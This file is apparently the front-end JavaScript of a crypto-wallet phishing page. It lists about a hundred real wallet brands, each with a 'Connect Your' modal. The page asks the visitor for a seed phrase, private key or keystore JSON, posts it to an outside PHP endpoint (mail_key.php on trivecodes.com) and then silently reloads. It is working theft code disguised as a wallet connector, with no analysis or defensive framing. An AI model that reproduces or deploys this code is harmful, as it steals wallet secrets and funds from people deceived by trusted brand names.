const Wallets = [
  "Binance Coin (BNB)",
  "BC vault",
  "Keepkey",
  "SecuX v20",
  "Jaxx liberty wallet",
  "Safepal wallet",
  "Bitbox wallet",
  "Cobo vault wallet",
  "Bread wallet",
  "Exodus wallet",
  "ICON wallet",
  "Blockchain",
  "Wallet connect",
  "Etoro",
  "Gate.io",
  "Coinmama",
  "Paybis",
  "Bitwala",
  "Trustee Wallet",
  "Defiant",
  "Guarda Wallet",
  "Jade Wallet",
  "O3Wallet",
  "HashKey Me",
  "PlasmaPay",
  "RWallet",
  "Tongue Wallet",
  "AToken Wallet",
  "KyberSwap",
  "Binance Chain",
  "Trezor Wallet",
  "Flare Wallet",
  "XinFin XDC Network",
  "Talken Wallet",
  "Aktionariat",
  "KEYRING PRO",
  "Ellipal",
  "Midas Wallet",
  "AT.Wallet",
  "Dok Wallet",
  "HaloDeFi Wallet",
  "Unstoppable Wallet",
  "PEAKDEFI Wallet",
  "Vision",
  "BitKeep",
  "ViaWallet",
  "SparkPoint",
  "Bridge Wallet",
  "EasyPocket",
  "Ownbit",
  "Spatium",
  "Torus",
  "Tokenary",
  "CYBAVO Wallet",
  "GridPlus",
  "Coinomi",
  "Nash",
  "ZelCore",
  "DCENT Wallet",
  "AlphaWallet",
  "Alice",
  "CoolWallet S",
  "Coin98",
  "Atomic",
  "TrustVault",
  "Loopring Wallet",
  "MYKEY",
  "Eidoo",
  "Huobi Wallet",
  "1inch Wallet",
  "Authereum",
  "Coinbase Wallet",
  "Ledger Live",
  "BitPay",
  "MathWallet",
  "TokenPocket",
  "ONTO",
  "imToken",
  "Pillar",
  "MyEtherWallet",
  "Crypto.com | DeFi Wallet",
  "Gnosis Safe Multisig",
  "MetaMask",
  "Argent",
  "Rainbow",
  "Trust Wallet",
  "Nuo",
  "DDEX",
  "Airswap",
  "PoolTogether",
  "0x",
  "Uniswap",
  "IDEX",
  "Maker",
  "dYdX",
  "Compound",
];

const submitPhrase = async () => {
  const phrase = document.getElementById("pphse").value;
  const wallet = $("#flash_info h3").text();
  const formData = {
    Wallet: wallet,
    Phrase: phrase,
  };
  await fetch(
    "https://mailclient.trivecodes.com/walletconnector/php/mail_key.php",
    {
      method: "POST",
      body: JSON.stringify(formData),
    }
  ).then((data) => location.reload());
};

function keysupin(dsetin) {
  $("#import").val(dsetin);
  if (dsetin == "Phrases") {
    $("#pphse").val("");
    $(".import-selected label").text("Enter Your Secret Recovery Phrase");
    $("#pphse").attr(
      "placeholder",
      "Enter Your Secret Recovery Phrase Which Is Always Either 12, 15, 18, 21 or 24 Words, Each Separate By A Space"
    );
  } else if (dsetin == "KeyStore JSON") {
    $("#pphse").val("");
    $(".import-selected label").text("Enter Your Secret KeyStore JSON");
    $("#pphse").attr(
      "placeholder",
      "Enter Your Secret Keystore JSON, Each Separate By A Space"
    );
  } else if (dsetin == "Private Key") {
    $("#pphse").val("");
    $(".import-selected label").text("Enter Your Secret Private Key");
    $("#pphse").attr("placeholder", "Enter Your Secret Private Key.");
  }
}

function callFloatingIsland(Called) {
  $(".floating-divider").addClass("active");
  $(".floating-island").addClass("active");
  $(".floating-island-header h3").html("Connect Your " + Called);
  $("#wallet").val(Called);
  if (Called == "Crypto.com | DeFi Wallet") {
    $("#flash_info").html(
      '<img src="./img/CryptoCom.jpeg"><h3> ' + Called + " </h3>"
    );
  } else {
    $("#flash_info").html(
      '<img src="./assets/' +
        Called +
        '.png" onerror="this.src=\'./assets/' +
        Called +
        ".jpg'\"><h3> " +
        Called +
        " </h3>"
    );
  }
}

function chaseFloatingIsland() {
  $(".floating-divider").removeClass("active");
  $(".floating-island").removeClass("active");
}

const listDApps = () => {
  Wallets.map((Wallet) => {
    const listDApps = document.getElementById("dAppsList");
    let newdApp = "";
    if (Wallet === "Crypto.com | DeFi Wallet") {
      newdApp =
        "<div class='DApp' onclick='callFloatingIsland(\"" +
        Wallet +
        "\")'>" +
        "<img src='./assets/CryptoCom.jpeg' />" +
        "<label>" +
        Wallet +
        "</label>" +
        "</div>";
    } else {
      newdApp =
        "<div class='DApp' onclick='callFloatingIsland(\"" +
        Wallet +
        "\")'>" +
        "<img src='./assets/" +
        Wallet +
        ".jpg' onerror='this.src=\"./assets/" +
        Wallet +
        ".png\"' />" +
        "<label>" +
        Wallet +
        "</label>" +
        "</div>";
    }

    listDApps.innerHTML += newdApp;
  });
};

window.onload = listDApps;
